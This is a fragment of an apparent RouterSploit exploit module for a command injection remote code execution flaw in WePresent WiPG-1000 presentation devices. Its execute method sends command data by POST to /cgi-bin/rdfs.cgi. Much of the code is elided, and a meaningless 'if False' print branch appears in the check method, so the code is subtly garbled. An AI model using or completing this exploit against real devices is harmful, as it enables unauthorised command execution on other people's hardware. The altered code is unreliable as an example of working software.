...
class Exploit(HTTPClient):
    __info__ = {'name': 'WePresent WiPG-1000 RCE', 'description': 'Module exploits WePresent WiPG-1000 Command Injection vulnerability which allows executing commands on operating system level.', 'authors': ('Matthias Brun', 'Marcin Bury <marcin[at]threat9.com>'), 'references': ('https://www.redguard.ch/advisories/wepresent-wipg1000.txt',), 'devices': ('WePresent WiPG-1000 <=2.0.0.7',)}
    ...
    def execute(self, cmd):
        ...
        self.http_request(method='POST', path='/cgi-bin/rdfs.cgi', data=data)
        return ''
    ...
    def check(self):
        if False:
            print('Hello World!')
        response = self.http_request(method='GET', path='/cgi-bin/rdfs.cgi')
